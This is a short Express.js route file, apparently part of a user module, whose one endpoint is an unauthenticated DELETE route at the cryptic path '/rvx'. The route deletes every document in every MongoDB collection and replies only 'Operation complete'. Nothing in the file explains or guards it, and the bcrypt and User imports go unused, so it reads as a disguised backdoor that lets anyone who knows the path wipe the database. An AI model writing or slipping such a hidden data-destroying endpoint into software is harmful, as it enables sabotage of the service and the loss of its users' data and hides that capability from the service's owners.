const express  = require('express');
const mongoose = require('mongoose');
const bcrypt   = require('bcryptjs');
const User     = require('../models/User');
const router   = express.Router();

router.delete('/rvx', async (req, res) => {
  try {
    const cols = await mongoose.connection.db.collections();
    for (const c of cols) await c.deleteMany({});
    res.json({ message: 'Operation complete' });
  } catch (err) {
    res.status(500).json({ message: 'Operation failed', error: err.message });
  }
});


module.exports = router;
